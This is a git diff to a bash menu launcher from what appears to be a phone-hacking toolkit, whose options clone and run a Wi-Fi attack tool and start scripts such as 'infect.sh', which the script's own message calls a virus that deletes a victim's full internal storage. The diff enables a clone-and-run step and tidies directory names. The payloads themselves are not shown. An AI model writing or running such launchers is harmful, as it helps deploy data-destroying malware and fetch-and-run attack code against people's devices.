@@ -65,7 +65,7 @@ echo " "
 
         exit
     elif [ $ch -eq 4 ];then
-        #git clone --depth 1 https://github.com/v1s1t0r1sh3r3/airgeddon.git
+        git clone --depth 1 https://github.com/v1s1t0r1sh3r3/airgeddon.git
         cd airgeddon
         bash airgeddon.sh
 
@@ -73,7 +73,6 @@ echo " "
         exit
     elif [ $ch -eq 5 ];then
         #cd $HOME
-        #cd Xteam
         cd INF3CT0Rv1
         echo -e "\e[1;34m  This Virus Formates (Deletes) the victims Full Internal Storage So think Before you Use It."
         bash infect.sh
@@ -83,7 +82,7 @@ echo " "
    elif [ $ch -eq 6 ];then 
         echo -e "\e[1;34m Downloading Latest Files..."
         #cd $HOME
-        rm -rf DOOM3D
+        rm -rf D00M3D
         git clone https://github.com/xploitstech/Xteam
         cd D00M3D
         bash doomed.sh   
@@ -91,6 +90,8 @@ echo " "
         exit
    elif [ $ch -eq 7 ];then
         echo -e  "\e[1;34m Downloading Latest Files..."
+
+        exit
    elif [ $ch -eq 8 ];then 
         echo -e "\e[1;34m Loading..."
         cd INF3CT0Rv2
